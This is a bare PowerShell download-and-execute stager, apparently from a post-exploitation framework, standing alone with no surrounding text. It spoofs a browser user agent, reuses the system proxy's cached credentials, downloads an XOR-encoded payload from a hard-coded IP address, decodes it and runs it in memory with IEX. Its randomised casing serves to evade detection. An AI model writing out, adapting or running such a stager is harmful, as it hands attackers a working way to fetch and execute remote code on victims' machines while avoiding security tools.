
$wC=NEW-ObJEcT SySTem.NeT.WebClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAderS.ADd('User-Agent',$u);$WC.PRoxY = [SySTem.Net.WEbREQUEST]::DEFaUlTWebPrOxy;$wC.PROxy.CredentiaLs = [SySTEm.NeT.CREDENTiALCAcHe]::DefaUltNetwoRkCredentiaLS;$K='[9):yFd_%at|h&HC>T+!Z?7oB*{Pu3Jx';$i=0;[CHAR[]]$b=([chAr[]]($wc.DOwnLoADSTrinG("http://104.130.51.215:80/index.asp")))|%{$_-BXOr$K[$i++%$K.LenGtH]};IEX ($b-joIN'')

